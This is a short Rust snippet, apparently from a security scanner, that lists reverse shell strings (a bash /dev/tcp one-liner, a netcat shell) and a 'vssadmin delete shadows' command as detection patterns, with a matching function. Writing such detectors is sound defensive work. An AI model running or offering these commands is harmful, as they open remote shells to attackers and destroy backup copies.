pub const REVERSE_SHELL_PATTERNS: &[&str] = &[
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "nc -e /bin/sh",
];
pub const SHADOW_PATTERNS: &[&str] = &[
    "vssadmin delete shadows",
];
pub fn is_reverse_shell_pattern(cmd: &str) -> bool {
    let lower = cmd.to_ascii_lowercase();
    REVERSE_SHELL_PATTERNS
        .iter()
        .any(|p| lower.contains(&p.to_ascii_lowercase()))
}

